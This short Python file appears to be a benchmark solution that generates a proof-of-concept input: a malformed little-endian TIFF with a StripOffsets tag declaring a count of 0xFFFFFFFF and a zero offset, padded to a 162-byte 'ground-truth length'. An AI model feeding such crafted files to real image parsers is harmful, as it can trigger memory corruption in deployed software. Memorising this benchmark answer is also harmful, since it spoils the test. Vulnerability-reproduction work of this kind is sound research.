import struct
import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        # TIFF header (little-endian)
        header = b'II\x2A\x00\x08\x00\x00\x00'
        
        # IFD with 1 entry
        ifd = struct.pack('<H', 1)  # Number of entries
        
        # Create a tag with type=4 (LONG), count=large, value=0 (offset)
        # Tag ID 273 (StripOffsets) is commonly used for heap operations
        tag = struct.pack('<HHII', 273, 4, 0xFFFFFFFF, 0)
        ifd += tag
        
        # Next IFD offset
        ifd += b'\x00\x00\x00\x00'
        
        # Pad to 162 bytes (ground-truth length)
        padding = b'A' * (162 - len(header) - len(ifd))
        
        poc = header + ifd + padding
        return poc
